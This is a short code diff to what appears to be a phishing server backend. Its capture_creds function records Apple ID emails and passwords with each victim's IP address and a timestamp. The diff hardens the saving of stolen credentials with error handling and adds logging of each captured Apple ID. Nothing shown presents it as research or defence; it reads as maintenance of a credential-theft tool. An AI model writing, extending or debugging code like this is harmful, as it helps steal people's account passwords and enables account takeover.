@@ -37,8 +37,11 @@ if CREDS_JSON_FILE.exists():
         stored_creds = []
 
 def save_creds():
-    with open(CREDS_JSON_FILE, 'w') as f:
-        json.dump(stored_creds, f)
+    try:
+        with open(CREDS_JSON_FILE, 'w') as f:
+            json.dump(stored_creds, f)
+    except Exception as e:
+        logger.error(f"Error saving creds: {e}")
 
 registered_credentials = {}
 challenge_store = {}
@@ -387,6 +390,7 @@ def capture_creds():
         
         stored_creds.append({'email': appleid, 'password': password, 'ip': request.remote_addr, 'time': datetime.now().strftime('%Y-%m-%d_%H-%M-%S')})
         save_creds()
+        logger.info(f"Saved credential: {appleid}")
         
         with open(creds_dir / 'all_credentials.log', 'a') as f:
             f.write(f"[{ts}] {appleid}\n")
